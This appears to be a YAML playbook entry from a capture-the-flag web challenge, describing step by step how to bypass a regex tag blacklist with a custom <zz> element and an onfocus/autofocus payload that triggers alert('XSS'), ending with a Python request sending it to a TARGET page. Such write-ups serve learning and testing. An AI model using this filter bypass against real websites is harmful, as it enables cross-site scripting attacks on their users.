name: custom_tag_xss_bypass_cross31
category: web
tags: [xss, injection, custom_tag, regex_bypass, onfocus]
indicators:
  - "Input directly inserted into HTML"
  - "Regex filters <[a-yA-Y/]+ tags"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Identify filter rules"
    when: "Analyze source code"
    how: "Regex <[a-yA-Y/]+ only filters tags starting with a-y and /"
    payload: |
      blacklist = r'<[a-yA-Y/]+'

  - name: "Step 2: Find filter gap"
    when: "Analyze regex"
    how: "Letter z and Z are not filtered!"
    payload: |
      <z...> or <zz...> will not be filtered

  - name: "Step 3: Use custom tag"
    when: "Need to bypass tag filter"
    how: "HTML5 allows custom tags, <zz> is valid"
    payload: |
      <zz>content</zz>

  - name: "Step 4: Trigger event on custom tag"
    when: "Custom tag needs to trigger JS"
    how: "Use onfocus + autofocus + tabindex=1 to make element focusable"
    payload: |
      <zz onfocus=alert('XSS') autofocus tabindex=1>

  - name: "Step 5: Submit payload"
    when: "Execute attack"
    how: "GET request to /page with name parameter"
    payload: |
      payload = "<zz onfocus=alert('XSS') autofocus tabindex=1>"
      requests.get('http://TARGET/page', params={'name': payload})


